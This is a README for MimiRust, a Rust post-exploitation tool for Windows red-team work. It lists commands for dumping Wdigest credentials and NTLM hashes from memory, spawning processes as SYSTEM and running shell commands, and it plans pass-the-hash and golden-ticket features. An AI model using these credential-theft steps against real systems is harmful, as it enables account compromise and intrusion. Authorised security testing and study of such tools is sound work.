# MimiRust - Hacking the Windows operating system to hand us the keys to the kingdom with Rust.

<code>

    ███▄ ▄███▓ ██▓ ███▄ ▄███▓ ██▓ ██▀███   █    ██   ██████ ▄▄▄█████▓
    ▓██▒▀█▀ ██▒▓██▒▓██▒▀█▀ ██▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒
    ▓██    ▓██░▒██▒▓██    ▓██░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░
    ▒██    ▒██ ░██░▒██    ▒██ ░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░
    ▒██▒   ░██▒░██░▒██▒   ░██▒░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░
    ░ ▒░   ░  ░░▓  ░ ▒░   ░  ░░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░
    ░  ░      ░ ▒ ░░  ░      ░ ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░
    ░      ░    ▒ ░░      ░    ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░    ░
           ░    ░         ░    ░     ░        ░           ░

                    written in Rust by ThottySploity
            mimiRust $ means it's running without elevated privileges
             mimiRust # means it's running with elevated privileges
              mimiRust @ means it's running with system privileges


    mimiRust @ ?

    Choose one of the following options:

      passwords:
              • dump-credentials             Dumps systems credentials through Wdigest.
              • dump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
              • clear                        Clears the screen of any past output.
              • exit                         Moves to top level menu

      pivioting:
              • shell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
              • clear                        Clears the screen of any past output.
              • exit                         Moves to top level menu
              • (W.I.P)psexec                Executes a service on another system.
              • (W.I.P)pth                   Pass-the-Hash to run a command on another system.
              • (W.I.P)golden-ticket         Creates a golden ticket for a user account with the domain.

      privilege:
              • spawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
              • clear                        Clears the screen of any past output.
              • exit                         Moves to top level menu

    mimiRust @ passwords
    mimiRust::passwords @ dump-credentials

</code>
<p>MimiRust is a post-exploitation tool that can be used within redteam operations. Like the name suggests the entire project is made within the Rust language. MimiRust is capable of the following actions:</p>
<ul>
  <li>Spawning any process as SYSTEM</li>
  <li>Executing shell commands</li>
  <li>Extracting Windows passwords out of memory through the wdigest attack vector.</li>
  <li>Extracting Windows NTLM hashes from user accounts (aes / des) & (md5 / rc4)</li>
</ul><br>
<p>Todo:</p>
<ul>
  <li>PSExec to create service on another endpoint.</li>
  <li>PtH (Pass-The-Hash)</li>
  <li>Kerberos Golden Ticket</li>
</ul>

<small><strong>Maybe in the future I will make it polymorphic and obfuscate the strings (also polymorphic) and API calls.</strong></small>


<h2>Quick usage:</h2>
<p>MimiRust can be ran in two different ways: from the command line using mimiRust.exe --help or in the shell by running the executable without any command line arguments. For help with the program type one of the following into mimiRust:</p>
<ul>
  <li><code>mimiRust # ?</code></li>
  <li><code>mimiRust # h</code></li>
  <li><code>mimiRust # help</code></li>
</ul>
<p>You will now be required to type in the module that you want to access, current modules are:</p>
<ul>
  <li><code>passwords</code></li>
  <li><code>pivioting</code></li>
  <li><code>privilege</code></li>
</ul>

<br><h3>Dumping credentials from memory through wdigest</h3>
<code>mimiRust::passwords # dump-credentials</code><br>
<code>mimiRust.exe --dump-credentials</code>
<br>

<br><h3>Dumping NTLM hashes from user accounts</h3>
<code>mimiRust::passwords @ dump-hashes</code><br>
<code>mimiRust.exe --dump-hashes</code>
<br>

<br><h3>Executing shell commands</h3>
<code>mimiRust::pivioting $ shell whoami</code>
<br>

<br><h3>Spawning a process with SYSTEM</h3>
<code>mimiRust::privilege # spawn-path cmd.exe</code><br>
<code>mimiRust.exe -s cmd.exe</code>

<h2>Demo</h2>
<small>click on the demo to get a higher resolution</small>
<img src="./demo.gif" alt="mimiRust Demo" width="100%">

<br><h3>Disclaimer</h3>
<p>I am not responsible for what you do with the information and code provided. This is intended for professional or educational purposes only.</p>
<br>
<h2>Author</h2>
<h3>Why was MimiRust made</h3>
<p>MimiRust was created as a project by a first years Cyber Security Bachelors student. The reason for this is because I was too bored learning about business processes in a Security Bachelors that I decided to just start for myself.</p>
<br>
